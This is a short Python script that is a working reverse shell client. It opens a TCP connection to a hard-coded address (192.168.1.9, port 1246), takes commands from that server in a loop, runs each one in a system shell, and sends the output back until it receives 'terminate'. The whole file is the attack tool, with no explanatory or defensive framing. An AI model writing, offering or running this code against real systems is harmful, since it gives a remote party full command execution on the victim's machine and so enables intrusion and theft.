from socket import *
import subprocess

def connect():
    conn = socket(AF_INET, SOCK_STREAM)
    # server ip
    conn.connect(("192.168.1.9", 1246))

    while 1:
        command = conn.recv(1024)
        command_decoded = command.decode("utf-8")

        if "terminate" in command_decoded:
            conn.close()
            break
        else:
            # subprocess for send the command in CMD
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # send output to server
            conn.send( CMD.stdout.read() )

def main():
    connect()

main()